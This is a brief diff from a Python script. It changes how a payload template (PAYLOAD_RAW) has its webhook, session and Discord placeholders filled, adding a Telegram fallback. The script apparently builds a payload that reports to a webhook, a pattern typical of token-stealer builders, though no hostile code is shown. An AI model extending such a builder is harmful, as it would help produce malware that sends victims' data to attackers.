@@ -245,7 +245,7 @@ def main():
         code = (
             PAYLOAD_RAW.replace("__WEBHOOK__", webhook_url)
             .replace("__SESSION__", fname_input)
-            .replace("__DISCORD__", C.DISCORD)
+            .replace("__DISCORD__", getattr(C, "TELEGRAM", C.DISCORD))
         )
         time.sleep(1)
 
